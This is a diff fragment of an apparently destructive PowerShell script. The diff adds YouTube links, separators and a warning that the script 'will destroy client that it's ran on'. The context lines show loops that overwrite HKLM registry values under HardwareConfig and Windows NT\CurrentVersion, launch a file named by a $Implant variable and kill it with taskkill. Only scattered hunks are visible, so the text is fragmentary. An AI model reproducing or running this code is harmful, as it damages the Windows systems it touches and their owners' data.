@@ -1,3 +1,8 @@
+https://youtube.com/shorts/8nbgOg3h6rw?feature=share
+https://youtube.com/shorts/wAE5hEgvOkc?feature=share
+https://youtu.be/DPTdkEs_dQs
+
+
 while($val -ne 0)
 {
 $val++
@@ -11,7 +16,7 @@ Set-ItemProperty -path "HKLM:\\SYSTEM\\HardwareConfig" -name "LastConfig" -value
 & .$Implant
 taskkill /IM $Implant /F
 }
-
+----------------------------
 while($val -ne 0)
 {
 $val++
@@ -36,6 +41,11 @@ Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\
 & .$Implant
 taskkill /IM $Implant /F}
 }
+----------------------------
+DO NOT RUN OUTSIDE OF SANDBOX
+this will destroy client that it's ran on!!
+
+
 
 while($val -ne 5)
 {
